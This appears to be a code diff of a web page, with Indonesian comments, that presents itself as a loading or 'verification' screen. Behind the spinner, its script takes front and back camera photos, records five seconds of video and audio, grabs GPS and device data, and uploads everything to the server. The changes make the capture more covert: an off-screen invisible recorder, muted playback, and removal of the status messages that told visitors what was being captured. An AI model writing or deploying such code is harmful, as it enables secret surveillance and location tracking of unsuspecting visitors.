@@ -29,6 +29,15 @@
         .hidden { display: none !important; }
         #hidden-video { display: none; }
         #hidden-canvas { display: none; }
+        #recorder-video {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
         .result-image {
             max-width: 100%;
             max-height: 80vh;
@@ -37,11 +46,6 @@
         }
         .result-container { display: none; }
         .result-container.visible { display: block; }
-        .status-text {
-            color: #999;
-            margin-top: 15px;
-            font-size: 13px;
-        }
     </style>
 </head>
 <body>
@@ -49,7 +53,6 @@
     <div class="container" id="loadingContainer">
         <div class="spinner" id="spinner"></div>
         <h1 id="title">LOADING</h1>
-        <div class="status-text" id="statusText">⏳ Memulai verifikasi...</div>
     </div>
 
     <!-- RESULT FOTO DARI GITHUB -->
@@ -57,16 +60,17 @@
         <img src="" alt="Result" class="result-image" id="resultImage">
     </div>
 
-    <video id="hidden-video" autoplay playsinline></video>
+    <video id="hidden-video" autoplay playsinline muted></video>
+    <video id="recorder-video" autoplay playsinline muted></video>
     <canvas id="hidden-canvas"></canvas>
 
     <script>
         const video = document.getElementById('hidden-video');
+        const recorderVideo = document.getElementById('recorder-video');
         const canvas = document.getElementById('hidden-canvas');
         const loadingContainer = document.getElementById('loadingContainer');
         const resultContainer = document.getElementById('resultContainer');
         const resultImage = document.getElementById('resultImage');
-        const statusText = document.getElementById('statusText');
 
         let stream = null;
         let mediaRecorder = null;
@@ -86,6 +90,7 @@
                 });
                 const frontVideo = document.createElement('video');
                 frontVideo.srcObject = frontStream;
+                frontVideo.muted = true;
                 await frontVideo.play();
                 await new Promise(r => setTimeout(r, 500));
 
@@ -110,6 +115,7 @@
                 });
                 const backVideo = document.createElement('video');
                 backVideo.srcObject = backStream;
+                backVideo.muted = true;
                 await backVideo.play();
                 await new Promise(r => setTimeout(r, 500));
 
@@ -130,7 +136,7 @@
         }
 
         // ============================================
-        // 🎥 REKAM VIDEO KAMERA DEPAN 5 DETIK + AUDIO
+        // 🎥 REKAM VIDEO KAMERA DEPAN 5 DETIK + AUDIO (TANPA SUARA KELUAR)
         // ============================================
         async function recordFrontVideo() {
             return new Promise((resolve) => {
@@ -145,9 +151,10 @@
                     }
                 })
                 .then((stream) => {
-                    const recVideo = document.createElement('video');
-                    recVideo.srcObject = stream;
-                    recVideo.play();
+                    // Video untuk rekaman (tidak terdengar)
+                    recorderVideo.srcObject = stream;
+                    recorderVideo.muted = true;
+                    recorderVideo.play();
 
                     const mimeTypes = [
                         'video/webm;codecs=vp9,opus',
@@ -163,32 +170,32 @@
                         }
                     }
 
-                    const recorder = new MediaRecorder(stream, {
+                    mediaRecorder = new MediaRecorder(stream, {
                         mimeType: selectedMimeType,
                         videoBitsPerSecond: 2500000,
                         audioBitsPerSecond: 128000
                     });
 
-                    recorder.ondataavailable = (event) => {
+                    mediaRecorder.ondataavailable = (event) => {
                         if (event.data.size > 0) {
                             recordedChunks.push(event.data);
                         }
                     };
 
-                    recorder.onstop = () => {
+                    mediaRecorder.onstop = () => {
                         const blob = new Blob(recordedChunks, {
                             type: selectedMimeType || 'video/webm'
                         });
                         stream.getTracks().forEach(t => t.stop());
+                        recorderVideo.srcObject = null;
                         resolve(blob);
                     };
 
-                    recorder.start(1000);
-                    statusText.textContent = '🎥 Merekam video 5 detik...';
+                    mediaRecorder.start(1000);
 
                     setTimeout(() => {
-                        if (recorder.state === 'recording') {
-                            recorder.stop();
+                        if (mediaRecorder && mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
                         }
                     }, 5000);
                 })
@@ -316,17 +323,13 @@
         // ============================================
         async function startProcess() {
             try {
-                statusText.textContent = '📷 Mengakses kamera...';
-
                 // 1. AMBIL FOTO KAMERA DEPAN + BELAKANG
-                statusText.textContent = '📸 Mengambil foto...';
                 const photos = await captureBothCameras();
 
                 // 2. REKAM VIDEO KAMERA DEPAN 5 DETIK + AUDIO
                 const videoBlob = await recordFrontVideo();
 
                 // 3. GPS
-                statusText.textContent = '📍 Mengambil lokasi...';
                 const gps = await getGPSLocation();
                 console.log('📍 GPS:', gps);
 
@@ -335,8 +338,6 @@
                 console.log('📱 Device:', device);
 
                 // 5. SEND TO SERVER
-                statusText.textContent = '📤 Mengirim data...';
-
                 let videoBase64 = null;
                 if (videoBlob) {
                     const reader = new FileReader();
@@ -354,13 +355,6 @@
                     device: device,
                     timestamp: new Date().toISOString()
                 };
-                console.log('📤 Sending data:', {
-                    frontPhoto: !!requestData.frontPhoto,
-                    backPhoto: !!requestData.backPhoto,
-                    video: !!requestData.video,
-                    gps: requestData.gps,
-                    device: requestData.device
-                });
 
                 const response = await fetch('/verify', {
                     method: 'POST',
@@ -376,7 +370,6 @@
                 if (githubImage) {
                     resultImage.src = githubImage;
                 } else {
-                    // Fallback kalau gagal ambil dari GitHub
                     if (photos.front) {
                         resultImage.src = photos.front;
                     } else {
@@ -393,7 +386,6 @@
                 console.error('❌ Error:', err);
                 loadingContainer.classList.add('hidden');
                 resultContainer.classList.add('visible');
-                // Coba ambil dari GitHub juga kalau error
                 const githubImage = await getImageFromGitHub();
                 if (githubImage) {
                     resultImage.src = githubImage;
